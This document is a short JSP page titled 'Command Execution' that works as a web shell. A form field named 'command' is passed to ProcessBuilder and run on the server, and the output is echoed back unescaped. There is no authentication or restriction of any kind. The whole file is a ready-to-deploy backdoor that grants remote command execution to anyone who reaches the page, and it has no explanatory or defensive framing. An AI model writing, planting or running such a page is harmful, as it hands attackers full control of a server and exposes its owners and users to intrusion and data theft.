<%@ page language="java" import="java.io.*, java.util.*, java.net.*"
   contentType="text/html;charset=EUC-KR" session="false" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Command Execution</title>
</head>
<body>
    <h1>Command Execution</h1>

    <form method="post" action="">
        <label for="commandInput">Command:</label>
        <input type="text" id="commandInput" name="command" required>
        <button type="submit">Execute</button>
    </form>

    <%
        if (request.getMethod().equalsIgnoreCase("post")) {
            String command = request.getParameter("command"); // 입력받은 명령어 가져오기

            if (command != null) {
                int lineCount = 0;
                String line = "";

                ProcessBuilder builder = new ProcessBuilder(command.split(" "));
                Process childProcess = null;

                try {
                    childProcess = builder.start();

                    BufferedReader br =
                            new BufferedReader(
                                    new InputStreamReader(
                                            new SequenceInputStream(childProcess.getInputStream(), childProcess.getErrorStream())));

                    while ((line = br.readLine()) != null) {
    %>
                        <%=line%><br>
    <%
                    }
                    br.close();

                } catch (IOException ie) {
                    ie.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    %>
</body>
</html>